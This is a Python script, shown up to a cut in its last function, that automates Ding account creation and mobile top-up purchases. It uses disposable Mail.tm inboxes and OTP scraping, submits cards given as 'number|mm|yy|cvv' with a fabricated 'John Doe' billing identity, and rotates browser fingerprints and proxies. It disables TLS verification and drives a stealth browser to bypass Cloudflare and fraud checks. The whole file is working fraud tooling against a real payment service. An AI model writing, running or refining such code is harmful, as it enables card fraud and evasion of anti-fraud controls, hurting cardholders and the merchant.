import os, sys

# Termux libc++ fix for curl_cffi dlopen
_libcxx = "/data/data/com.termux/files/usr/lib/libc++_shared.so"
if os.path.exists(_libcxx):
    cur_preload = os.environ.get("LD_PRELOAD", "")
    if _libcxx not in cur_preload:
        os.environ["LD_PRELOAD"] = f"{_libcxx} {cur_preload}".strip()
        os.execv(sys.executable, [sys.executable] + sys.argv)

import argparse

def parse_cli_args() -> argparse.Namespace:
    """Parse command‑line arguments.

    Positional arguments (optional):
        card   – credit‑card string ``number|mm|yy|cvv`` (prompts if omitted).
        phone  – full phone number with country code (prompts if omitted).
    Optional ``--product`` forces a specific Ding product code.
    """
    parser = argparse.ArgumentParser(description="Ding auto‑register + top‑up")
    parser.add_argument("card", nargs="?", default=None, help="Card string: number|mm|yy|cvv (optional)")
    parser.add_argument("phone", nargs="?", default=None, help="Phone number with country code (optional)")
    parser.add_argument("--product", dest="product", default=None,
                        help="Force a specific product code, e.g. IN-AI-Data-4.49-USD")
    return parser.parse_args()

import re, json, time, random, uuid, string, hashlib, html
from urllib.parse import urlencode, quote, urlparse, parse_qs
import requests

try:
    from curl_cffi import requests as cffi_requests
    HAS_CURL_CFFI = True
except Exception:
    cffi_requests = None
    HAS_CURL_CFFI = False

try:
    import asyncio as _asyncio
    from camoufox.async_api import AsyncCamoufox
    HAS_CAMOUFOX = True
except Exception:
    HAS_CAMOUFOX = False

# ─── Country & CC parser ───────────────────────────────────────────────────

PHONE_COUNTRY_MAP = {
    # 1-digit prefixes
    "1": "US",
    "7": "RU",
    # 2-digit prefixes
    "20": "EG", "27": "ZA", "30": "GR", "31": "NL", "32": "BE", "33": "FR", "34": "ES",
    "36": "HU", "39": "IT", "40": "RO", "41": "CH", "43": "AT", "44": "GB", "45": "DK",
    "46": "SE", "47": "NO", "48": "PL", "49": "DE", "51": "PE", "52": "MX", "53": "CU",
    "54": "AR", "55": "BR", "56": "CL", "57": "CO", "58": "VE", "60": "MY", "61": "AU",
    "62": "ID", "63": "PH", "64": "NZ", "65": "SG", "66": "TH", "81": "JP", "82": "KR",
    "84": "VN", "86": "CN", "90": "TR", "91": "IN", "92": "PK", "93": "AF", "94": "LK",
    "95": "MM", "98": "IR",
    # 3-digit prefixes
    "212": "MA", "213": "DZ", "216": "TN", "218": "LY", "220": "GM", "221": "SN",
    "222": "MR", "223": "ML", "224": "GN", "225": "CI", "226": "BF", "227": "NE",
    "228": "TG", "229": "BJ", "230": "MU", "231": "LR", "232": "SL", "233": "GH",
    "234": "NG", "235": "TD", "236": "CF", "237": "CM", "238": "CV", "239": "ST",
    "240": "GQ", "241": "GA", "242": "CG", "243": "CD", "244": "AO", "245": "GW",
    "248": "SC", "249": "SD", "250": "RW", "251": "ET", "252": "SO", "253": "DJ",
    "254": "KE", "255": "TZ", "256": "UG", "257": "BI", "258": "MZ", "260": "ZM",
    "261": "MG", "263": "ZW", "264": "NA", "265": "MW", "266": "LS", "267": "BW",
    "268": "SZ", "269": "KM", "297": "AW", "298": "FO", "299": "GL", "350": "GI",
    "351": "PT", "352": "LU", "353": "IE", "354": "IS", "355": "AL", "356": "MT",
    "357": "CY", "358": "FI", "359": "BG", "370": "LT", "371": "LV", "372": "EE",
    "373": "MD", "374": "AM", "375": "BY", "376": "AD", "377": "MC", "378": "SM",
    "380": "UA", "381": "RS", "382": "ME", "385": "HR", "386": "SI", "387": "BA",
    "389": "MK", "420": "CZ", "421": "SK", "423": "LI", "501": "BZ", "502": "GT",
    "503": "SV", "504": "HN", "505": "NI", "506": "CR", "507": "PA", "509": "HT",
    "591": "BO", "592": "GY", "593": "EC", "595": "PY", "597": "SR", "598": "UY",
    "670": "TL", "673": "BN", "674": "NR", "675": "PG", "676": "TO", "677": "SB",
    "678": "VU", "679": "FJ", "680": "PW", "682": "CK", "685": "WS", "686": "KI",
    "687": "NC", "688": "TV", "689": "PF", "691": "FM", "692": "MH", "852": "HK",
    "853": "MO", "855": "KH", "856": "LA", "880": "BD", "886": "TW", "960": "MV",
    "961": "LB", "962": "JO", "963": "SY", "964": "IQ", "965": "KW", "966": "SA",
    "967": "YE", "968": "OM", "970": "PS", "971": "AE", "972": "IL", "973": "BH",
    "974": "QA", "975": "BT", "976": "MN", "977": "NP", "992": "TJ", "993": "TM",
    "994": "AZ", "995": "GE", "996": "KG", "998": "UZ"
}


def detect_country_from_phone(phone: str) -> str:
    clean = phone.strip().lstrip("+").lstrip("0")
    for length in (3, 2, 1):
        prefix = clean[:length]
        if prefix in PHONE_COUNTRY_MAP:
            return PHONE_COUNTRY_MAP[prefix]
    return "US"


def detect_card_brand(number: str) -> str:
    clean = re.sub(r"\D", "", number)
    length = len(clean)

    if clean.startswith("4") and length in (13, 16):
        return "VISA"
    if clean.startswith(("51", "52", "53", "54", "55")) and length == 16:
        return "MasterCard"
    if clean[:4].isdigit() and 2221 <= int(clean[:4]) <= 2720 and length == 16:
        return "MasterCard"
    if clean.startswith(("34", "37")) and length == 15:
        return "Amex"
    if clean.startswith(("6011", "65")) and length == 16:
        return "Discover"
    if clean.startswith(("644", "645")) and length == 16:
        return "Discover"
    if clean.startswith(("3528", "3529", "353", "354", "355", "356", "357", "358")) and length == 16:
        return "JCB"
    if clean.startswith("62") and length in (16, 18, 19):
        return "UnionPay"
    return "Unknown"


def _luhn_check(num: str) -> bool:
    d = [int(x) for x in num][::-1]
    s = sum(d[0::2]) + sum(sum(divmod(x * 2, 10)) for x in d[1::2])
    return s % 10 == 0


def parse_cc_input(cc_line: str) -> dict:
    parts = re.split(r"[:|/]", cc_line.strip().strip("\ufeff"))
    if len(parts) < 4:
        raise ValueError("CC format: number|month|year|cvv")
    number = re.sub(r"\D", "", parts[0].strip())
    if not _luhn_check(number):
        raise ValueError(f"Invalid card number: Luhn check failed for `{number}`")
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    if len(year) == 2:
        year = f"20{year}"
    cvv = parts[3].strip()
    visible = " ".join([number[i:i+4] for i in range(0, len(number), 4)])
    return {
        "number": number,
        "number_visible": visible,
        "expiry_month": month,
        "expiry_year": year,
        "cvv": cvv,
        "holder": "John Doe",
        "billing_street": "123 Main St",
        "billing_street_number": "1",
        "billing_city": "New York",
        "billing_country": "US",
        "billing_state": "NY",
        "billing_zip": "10001",
    }


# ─── Mail.tm helpers ─────────────────────────────────────────────────────────

MAIL_TM_BASE = "https://api.mail.tm"


def mail_get_domain() -> str:
    for attempt in range(5):
        try:
            r = requests.get(f"{MAIL_TM_BASE}/domains", timeout=10)
            if r.status_code == 200:
                domains = r.json().get("hydra:member", [])
                active = [d["domain"] for d in domains if d.get("isActive")]
                if active:
                    return random.choice(active)
            elif r.status_code == 429:
                time.sleep((attempt + 1) * 2)
        except Exception:
            time.sleep(2)
    raise RuntimeError("Failed to retrieve active Mail.tm domains")


def mail_create_account(address: str, password: str) -> dict:
    for attempt in range(5):
        try:
            r = requests.post(f"{MAIL_TM_BASE}/accounts", json={"address": address, "password": password}, timeout=10)
            if r.status_code == 429:
                wait = (attempt + 1) * 3
                print(f"[!] Mail.tm rate limited, retrying in {wait}s ...")
                time.sleep(wait)
                continue
            r.raise_for_status()
            return r.json()
        except Exception as e:
            if attempt == 4:
                raise RuntimeError(f"Mail.tm account creation failed: {e}")
            time.sleep(2)
    raise RuntimeError("Mail.tm account creation failed after retries")


def mail_get_token(address: str, password: str) -> str:
    for attempt in range(5):
        try:
            r = requests.post(f"{MAIL_TM_BASE}/token", json={"address": address, "password": password}, timeout=10)
            if r.status_code == 429:
                wait = (attempt + 1) * 3
                time.sleep(wait)
                continue
            if r.status_code == 200:
                return r.json()["token"]
        except Exception:
            pass
        time.sleep(2)
    raise RuntimeError("Mail.tm get token failed after retries")


def mail_fetch_messages(token: str) -> list:
    try:
        r = requests.get(f"{MAIL_TM_BASE}/messages", headers={"Authorization": f"Bearer {token}"}, timeout=10)
        if r.status_code == 200:
            return r.json().get("hydra:member", [])
    except Exception:
        pass
    return []


def mail_get_message(token: str, msg_id: str) -> dict:
    for attempt in range(3):
        try:
            r = requests.get(f"{MAIL_TM_BASE}/messages/{msg_id}", headers={"Authorization": f"Bearer {token}"}, timeout=30)
            r.raise_for_status()
            return r.json()
        except Exception:
            if attempt < 2:
                time.sleep(3)
    raise RuntimeError(f"Failed to fetch message {msg_id} after 3 attempts")


# ─── OTP extraction ──────────────────────────────────────────────────────────

def extract_otp(text: str) -> str | None:
    match = re.search(r"\b(\d{6})\b", text)
    return match.group(1) if match else None


# ─── Ding API ────────────────────────────────────────────────────────────────

DING_API = "https://api-v2.www.ding.com"
DING_ORIGIN = "https://www.ding.com"
PP2_BASE = "https://pp2.ding.com"

# ─── Strong Browser Fingerprints ─────────────────────────────────────────────
# Only use impersonate versions that actually work for HTTP requests with curl_cffi 0.16.1
# Verified working: chrome100,101,104,107,110,116,119,123,124,131,136 + generic chrome
WORKING_IMPERSONATE = [
    ("chrome136", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
    ("chrome131", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome123", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"),
    ("chrome119", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"),
    ("chrome116", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"),
    ("chrome110", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"),
    ("chrome107", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"),
    ("chrome104", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"),
    ("chrome101", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"),
    ("chrome100", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36"),
]

# Generate per-session consistent fingerprint from a random seed
_fingerprint_seed = random.randint(0, len(WORKING_IMPERSONATE) - 1)
IMPERSONATE, USER_AGENT = WORKING_IMPERSONATE[_fingerprint_seed]

# Build matching sec-ch-ua header from UA version
_chrome_ver = re.search(r"Chrome/(\d+)", USER_AGENT)
CHROME_MAJOR = _chrome_ver.group(1) if _chrome_ver else "136"

def _build_sec_ch_ua():
    return f'\"Chromium\";v=\"{CHROME_MAJOR}\", \"Google Chrome\";v=\"{CHROME_MAJOR}\", \"Not/A)Brand\";v=\"99\"'

# Realistic screen/viewport fingerprints (rotate per session)
SCREEN_CONFIGS = [
    {"w": "1920", "h": "1080", "depth": "24", "tz": "-300", "lang": "en-US,en;q=0.9"},
    {"w": "1366", "h": "768",  "depth": "24", "tz": "-480", "lang": "en-US,en;q=0.9"},
    {"w": "1536", "h": "864",  "depth": "30", "tz": "-300", "lang": "en-US,en;q=0.9"},
    {"w": "1440", "h": "900",  "depth": "24", "tz": "-360", "lang": "en-US,en;q=0.9"},
    {"w": "2560", "h": "1440", "depth": "30", "tz": "-420", "lang": "en-US,en;q=0.9"},
    {"w": "1280", "h": "720",  "depth": "24", "tz": "-240", "lang": "en-US,en;q=0.9"},
]
_SCREEN = random.choice(SCREEN_CONFIGS)

# Generate a stable client hash for correlation
_CLIENT_ID = hashlib.md5(f"{USER_AGENT}{_SCREEN['w']}{_SCREEN['h']}{uuid.uuid4().hex[:8]}".encode()).hexdigest()[:16]


def ding_headers(referer: str = "/login", bearer: str | None = None) -> dict:
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-language": "en-US",
        "content-type": "text/plain;charset=UTF-8",
        "origin": DING_ORIGIN,
        "referer": f"{DING_ORIGIN}{referer}",
        "sec-ch-ua": _build_sec_ch_ua(),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": USER_AGENT,
        "x-client-id": _CLIENT_ID,
    }
    if bearer:
        headers["authorization"] = f"Bearer {bearer}"
    return headers


def create_ding_session(proxy: dict | None = None):
    if HAS_CURL_CFFI and cffi_requests is not None:
        try:
            # verify=False allows MITM proxies (common with free proxy lists)
            # to intercept TLS without breaking the flow. Cloudflare/Adyen
            # anti-bot checks happen at the TLS-fingerprint layer (impersonate)
            # not at cert validation, so this is safe in this context.
            return cffi_requests.Session(impersonate=IMPERSONATE, proxies=proxy, verify=False)
        except Exception:
            return cffi_requests.Session(impersonate=IMPERSONATE, verify=False)
    s = requests.Session()
    if proxy:
        s.proxies.update(proxy)
        s.verify = False  # allow MITM proxies
    # Suppress InsecureRequestWarning for plain requests fallback
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except Exception:
        pass
    # Set realistic default headers for plain requests
    s.headers.update({
        "user-agent": USER_AGENT,
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua": _build_sec_ch_ua(),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
    })
    return s


def ding_bootstrap(session, bearer: str | None = None) -> dict:
    r = session.get(f"{DING_API}/api/view/bootstrap", headers=ding_headers(bearer=bearer))
    r.raise_for_status()
    return r.json()


def ding_submit_email(session, email: str) -> dict:
    payload = {"email": email, "uniqueId": str(uuid.uuid4())}
    r = session.post(f"{DING_API}/api/submitemail", headers=ding_headers(), data=json.dumps(payload))
    r.raise_for_status()
    return r.json()


def ding_verify_email(session, code: str, email: str, verification_id: str) -> dict:
    now = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    payload = {
        "code": code, "email": email, "verificationId": verification_id,
        "receiveEmails": True, "referralCode": "",
        "trackingData": [
            {"item1": "RegistrationSource", "item2": "ding.com"},
            {"item1": "SessionsCount", "item2": "1"},
            {"item1": "FirstVisitUtcDateTime", "item2": now},
            {"item1": "LastVisitUtcDateTime", "item2": now},
            {"item1": "PreviousVisitUtcDateTime", "item2": ""},
            {"item1": "IntelliadId", "item2": ""},
            {"item1": "OptedIntoMarketing", "item2": ""},
        ],
        "uniqueId": str(uuid.uuid4()),
    }
    for attempt in range(3):
        r = session.post(f"{DING_API}/api/verifyemail/ext", headers=ding_headers(), data=json.dumps(payload))
        if r.status_code == 400 and "throttle" in r.text.lower():
            wait = 15 * (attempt + 1)
            print(f"[!] Throttled, retrying in {wait}s (attempt {attempt+1}/3) ...")
            time.sleep(wait)
            continue
        if r.status_code >= 400:
            print(f"[DEBUG] verify {r.status_code}: {r.text}")
        r.raise_for_status()
        return r.json()
    raise RuntimeError("Ding verify failed (throttled)")


# ─── Topup API calls ────────────────────────────────────────────────────────

def ding_operator_lookup(session, phone: str, country: str, bearer: str) -> dict:
    payload = {"phoneNumber": phone, "selectedCountryIso": country, "uniqueId": str(uuid.uuid4())}
    r = session.post(
        f"{DING_API}/api/operatorlookup",
        headers=ding_headers(referer=f"/topup?countryIso={country}", bearer=bearer),
        data=json.dumps(payload),
    )
    r.raise_for_status()
    return r.json()


def ding_country_operators(session, country: str, bearer: str) -> dict:
    r = session.get(
        f"{DING_API}/api/countryoperators/{country}",
        headers=ding_headers(referer=f"/topup?countryIso={country}", bearer=bearer),
    )
    r.raise_for_status()
    return r.json()


def ding_choose_purchase(session, product_code: str, phone: str, bearer: str) -> dict:
    payload = {
        "productCode": product_code,
        "accountNumber": phone,
        "promoCode": "",
        "autoTopupInterval": 0,
        "autoTopupStartTime": None,
        "fType": "PurchaseChosen",
        "expectedPaymentType": "Unknown",
        "smsText": None,
        "keepUpsell": False,
        "uniqueId": str(uuid.uuid4()),
    }
    r = session.post(
        f"{DING_API}/api/choosepurchase",
        headers=ding_headers(referer="/topup", bearer=bearer),
        data=json.dumps(payload),
    )
    if r.status_code >= 400:
        print(f"[!] Choose purchase HTTP {r.status_code}: {r.text[:2000]}")
    r.raise_for_status()
    return r.json()


def ding_poll_purchase(session, order_ref: str, bearer: str) -> dict:
    url = f"{DING_API}/api/pollpurchase/{order_ref}"
    r = session.get(
        url,
        headers=ding_headers(referer="/orderpolling", bearer=bearer),
    )
    r.raise_for_status()
    return r.json()


# ─── PP2 payment form ───────────────────────────────────────────────────────

def extract_form_fields(html: str) -> dict:
    fields = {}
    for inp in re.finditer(r"<input[^>]*>", html, re.IGNORECASE):
        tag = inp.group(0)
        name_m = re.search(r'name=["\']([^"\']+)', tag, re.IGNORECASE)
        val_m = re.search(r'value=["\']([^"\']*)', tag, re.IGNORECASE)
        if not name_m:
            name_m = re.search(r"name\s*=\s*([^\s>]+)", tag, re.IGNORECASE)
        if not val_m:
            val_m = re.search(r"value\s*=\s*([^\s>]+)", tag, re.IGNORECASE)
        if name_m:
            n = name_m.group(1).strip('"\'')
            v = val_m.group(1).strip('"\'') if val_m else ""
            # decode html entities in value
            v = v.replace("&quot;", '"').replace("&#39;", "'").replace("&amp;", "&")
            fields[n] = v
    # also capture textarea/select hidden fields if needed
    for m in re.finditer(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</textarea>', html, re.IGNORECASE | re.DOTALL):
        fields[m.group(1)] = m.group(2).strip()
    return fields


def pp2_submit_card(session, card: dict, payment_url: str,
                    billing_country_iso: str = "US", proxy: dict | None = None):
    """Submit card to pp2.ding.com/en/paymentforms exactly like real browser.
    Key: URL params (skinCss, tenantRef, etc.) go in the URL query string,
    not in the form body. pp2 uses URL params to look up the skin."""
    parsed = urlparse(payment_url)
    raw_query = parsed.query

    # Resolve client-side template variables that Ding JS normally replaces
    # These are URL-encoded in the query string: %7BchannelRef%7D, %7BclientReturnUrl%7D
    for tpl, val in [("{channelRef}", "webrebrand"),
                     ("{clientReturnUrl}", "https://www.ding.com/orderpolling"),
                     ("%7BchannelRef%7D", "webrebrand"),
                     ("%7BclientReturnUrl%7D", "https%3A%2F%2Fwww.ding.com%2Forderpolling")]:
        raw_query = raw_query.replace(tpl, val)

    url_params = {k: v[0] for k, v in parse_qs(raw_query, keep_blank_values=True).items()}

    brand = detect_card_brand(card["number"])
    billing_country = card.get("billing_country", billing_country_iso)
    billing_state = card.get("billing_state", "N/A")
    billing_zip = card.get("billing_zip", "10001")
    holder = card.get("holder", "John Doe")
    nonce = str(uuid.uuid4())

    amount_val = float(url_params.get("EURAmount", url_params.get("INRAmount", "0")))
    currency_match = re.search(r'([A-Z]{3})Amount', payment_url)
    payment_currency = currency_match.group(1) if currency_match else "EUR"
    amount_key = f"{payment_currency}Amount"
    amount_str = url_params.get(amount_key, str(amount_val))

    symbols = {"EUR": "\u20ac", "INR": "\u20b9", "USD": "$", "GBP": "\u00a3", "AED": "AED ", "THB": "\u0e3f"}
    sym = symbols.get(payment_currency, payment_currency + " ")
    display_amount = f"{payment_currency} {sym}{amount_str}"

    # ── URL query string params (pp2 needs these to look up the skin) ──
    qs_params = {}
    for k in ["skinCss", "tenantRef", "tenantMarket", "agentChannel",
              "clientVersion", "authenticationToken", "channelRef",
              "paymentCurrencyIso", "clientReturnUrl", "orderRef", "userRef",
              "CardType", "EURAmount", "INRAmount"]:
        if k in url_params:
            qs_params[k] = url_params[k]
    if "skinCss" not in qs_params:
        qs_params["skinCss"] = "{skinCss}"
    if "tenantRef" not in qs_params:
        qs_params["tenantRef"] = "DotCom"
    if "channelRef" not in qs_params:
        qs_params["channelRef"] = "webrebrand"
    # Resolve client-side template variables in GET URL
    resolved_get_url = payment_url
    for tpl, val in [("{channelRef}", "webrebrand"),
                     ("{clientReturnUrl}", "https://www.ding.com/orderpolling"),
                     ("%7BchannelRef%7D", "webrebrand"),
                     ("%7BclientReturnUrl%7D", "https%3A%2F%2Fwww.ding.com%2Forderpolling"),
                     ("{skinCss}", "%7BskinCss%7D"),
                     ("%7BskinCss%7D", "%7BskinCss%7D")]:
        resolved_get_url = resolved_get_url.replace(tpl, val)

    pp2_session = cffi_requests.Session(impersonate=IMPERSONATE, proxies=proxy if proxy else None, verify=False)

    # 1. GET newcardform to initialize session and extract server tokens
    print(f"[+] PP2: Fetching payment form page ...")
    r_get = pp2_session.get(
        resolved_get_url,
        headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "sec-ch-ua": _build_sec_ch_ua(),
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "iframe",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "user-agent": USER_AGENT,
        },
        timeout=15,
    )
    print(f"[+] PP2 GET: {r_get.status_code} ({len(r_get.text)} bytes)")

    # Extract all rendered hidden fields from the server HTML
    extracted_fields = extract_form_fields(r_get.text)

    # Determine post URL from form action
    form_action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', r_get.text, re.I)
    form_action = form_action_match.group(1) if form_action_match else "/en/paymentforms"
    if not form_action.startswith("http"):
        post_url = f"{PP2_BASE}{form_action}"
    else:
        post_url = form_action

    # If post_url doesn't have query string, append qs_params
    if "?" not in post_url:
        post_url = f"{post_url}?{urlencode(qs_params, safe='{}')}"

    # Build complete form data
    form_data = dict(extracted_fields)
    form_data.update({
        "CardNumberVisible": card["number_visible"],
        "CreditCardExpiryDate": f"{card['expiry_month']}/{card['expiry_year'][-2:]}",
        "Cvv": card["cvv"],
        "BillingName": holder,
        "BillingStreet": card.get("billing_street", "N/A"),
        "BillingStreetNumber": card.get("billing_street_number", "N/A"),
        "BillingCity": card.get("billing_city", "N/A"),
        "BillingCountryIso": billing_country,
        "BillingStateInput": billing_state,
        "BillingZip": billing_zip,
        "StoreSecurely": "True",
        "CardNumber": card["number"],
        "ExpiryDateMonth": card["expiry_month"],
        "ExpiryDateYear": card["expiry_year"],
        "Language": "en",
        "OrderRef": url_params.get("orderRef", extracted_fields.get("OrderRef", "")),
        "UserRef": url_params.get("userRef", extracted_fields.get("UserRef", "")),
        "CardType": brand,
        "TenantRef": url_params.get("tenantRef", extracted_fields.get("TenantRef", "DotCom")),
        "TenantMarket": url_params.get("tenantMarket", extracted_fields.get("TenantMarket", "Ding")),
        "AgentChannel": url_params.get("agentChannel", extracted_fields.get("AgentChannel", "Desktop")),
        "ClientVersion": url_params.get("clientVersion", extracted_fields.get("ClientVersion", "ding-desktop")),
        "AuthenticationToken": url_params.get("authenticationToken", extracted_fields.get("AuthenticationToken", "")),
        "ChannelRef": url_params.get("channelRef", extracted_fields.get("ChannelRef", "webrebrand")),
        "PaymentCurrencyIso": url_params.get("paymentCurrencyIso", extracted_fields.get("PaymentCurrencyIso", payment_currency)),
        "ClientReturnUrl": "https://www.ding.com/orderpolling",
        "Nonce": extracted_fields.get("Nonce", nonce),
        "DisplayPaymentAmount": extracted_fields.get("DisplayPaymentAmount", display_amount),
        "OriginalPaymentValue": extracted_fields.get("OriginalPaymentValue", amount_str),
        "SupportsExtraFields": "False",
        "BillingState": billing_state,
        "SupportsReentry": "True",
        "AdyenApiVersion": url_params.get("adyenApiVersion", extracted_fields.get("AdyenApiVersion", "69")),
        "BrowserInfo.AcceptHeader": "text",
        "BrowserInfo.ColorDepth": _SCREEN["depth"],
        "BrowserInfo.JavaEnabled": "false",
        "BrowserInfo.Language": _SCREEN["lang"],
        "BrowserInfo.ScreenHeight": _SCREEN["h"],
        "BrowserInfo.ScreenWidth": _SCREEN["w"],
        "BrowserInfo.TimeZoneOffset": _SCREEN["tz"],
        "BrowserInfo.UserAgent": USER_AGENT,
        "CvvRequired": "CVV required",
        "CvcRequired": "CVC required",
        "CidRequired": "CID required",
        "CvvInvalid": "Invalid CVV",
        "CvcInvalid": "Invalid CVC",
        "CidInvalid": "Invalid CID",
    })

    # 2. POST card data with session cookies preserved
    r = pp2_session.post(
        post_url,
        headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "origin": PP2_BASE,
            "referer": resolved_get_url,
            "sec-ch-ua": _build_sec_ch_ua(),
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "iframe",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": USER_AGENT,
        },
        data=urlencode(form_data),
        allow_redirects=True,
    )
    pp2_session.close()

    print(f"[+] PP2 POST: {r.status_code} ({len(r.text)} bytes)")

    # Copy pp2 cookies back to main session for polling
    try:
        for cookie in r.cookies:
            session.cookies.set(cookie.name, cookie.value, domain="pp2.ding.com")
    except Exception:
        pass

    return r


def pp2_poll_payment_state(session, order_ref: str, payment_attempt_ref: str,
                           max_polls: int = 10, interval: int = 2) -> dict:
    for i in range(max_polls):
        ts = int(time.time() * 1000)
        url = f"{PP2_BASE}/paymentforms/paymentstate?orderRef={order_ref}&paymentAttemptRef={payment_attempt_ref}&supportsReentry=True&tenantRef=DotCom&_={ts}"
        try:
            r = session.get(url, headers={
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "x-requested-with": "XMLHttpRequest",
                "referer": f"{PP2_BASE}/en/paymentforms",
                "sec-ch-ua": _build_sec_ch_ua(),
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": USER_AGENT,
            }, timeout=10)
            print(f"    [pp2_poll {i+1}/{max_polls}] HTTP {r.status_code}")
            if r.status_code == 200 and r.text.strip():
                try:
                    data = r.json()
                    status = data.get("status", data.get("paymentState", ""))
                    if status and status.lower() not in ("pending", ""):
                        return data
                except Exception:
                    pass
        except Exception as e:
            print(f"    [pp2_poll {i+1}/{max_polls}] Error: {e}")
        time.sleep(interval)
    return {"status": "Timeout", "paymentState": "Timeout", "description": "Payment state polling timed out"}


# ─── Camoufox full payment flow (CF bypass + card submit) ─────────────────────

def pp2_submit_camoufox(payment_url: str, bearer: str, card: dict,
                        billing_country_iso: str = "US", timeout: int = 90) -> dict:
    """Full pp2 payment flow via camoufox: load ding.com/payment → pp2 iframe → fill card → submit.
    Returns dict with keys: status_code, html, response_url, error, redirect_url"""
    if not HAS_CAMOUFOX:
        return {"status_code": 0, "html": "", "response_url": "", "error": "camoufox not installed", "redirect_url": ""}

    result = {"status_code": 0, "html": "", "response_url": "", "error": "", "redirect_url": ""}

    async def _run():
        try:
            async with AsyncCamoufox(headless=False) as browser:
                page = await browser.new_page()

                captured_requests = []
                captured_responses = []
                def on_req(req):
                    if 'pp2.ding' in req.url:
                        entry = {'method': req.method, 'url': req.url}
                        if req.method == 'POST':
                            entry['post_data'] = req.post_data
                        captured_requests.append(entry)
                def on_resp(resp):
                    if 'pp2.ding' in resp.url:
                        captured_responses.append({'url': resp.url, 'status': resp.status})
                page.on('request', on_req)
                page.on('response', on_resp)

                # Set Ding session cookies before navigating
                print("[camoufox] Setting Ding session ...")
                await page.goto(DING_ORIGIN, timeout=30000, wait_until='domcontentloaded')
                await page.wait_for_timeout(2000)
                await page.evaluate(f'''() => {{
                    localStorage.setItem("ding_token", "{bearer}");
                    document.cookie = "ding_crt=true; path=/; domain=.ding.com";
                }}''')

                # Navigate to payment page with the order
                parsed = urlparse(payment_url)
                order_ref = parse_qs(parsed.query).get('orderRef', [''])[0]
                payment_page_url = f"{DING_ORIGIN}/payment?orderRef={order_ref}"
                print(f"[camoufox] Loading payment page: {payment_page_url[:100]} ...")

                await page.goto(payment_page_url, timeout=timeout * 1000, wait_until='domcontentloaded')

                # Wait for pp2 iframe to appear
                print("[camoufox] Waiting for pp2 iframe ...")
                pp2_frame = None
                for i in range(30):
                    await page.wait_for_timeout(2000)
                    frames = page.frames
                    for frame in frames:
                        if 'pp2.ding.com' in frame.url:
                            pp2_frame = frame
                            break
                    if pp2_frame:
                        print(f"[camoufox] Found pp2 iframe at iteration {i}!")
                        break
                    print(f"  [{i}] {len(frames)} frames, URL: {page.url[:80]}")

                if not pp2_frame:
                    # Fallback: navigate directly to pp2
                    print("[camoufox] No pp2 iframe found, navigating directly ...")
                    resolved_url = (payment_url
                                    .replace("{channelRef}", "webrebrand")
                                    .replace("{clientReturnUrl}", "https://www.ding.com/orderpolling"))
                    resp = await page.goto(resolved_url, timeout=timeout * 1000, wait_until='domcontentloaded')
                    for i in range(15):
                        await page.wait_for_timeout(2000)
                        content = await page.content()
                        if len(content) > 5000:
                            break

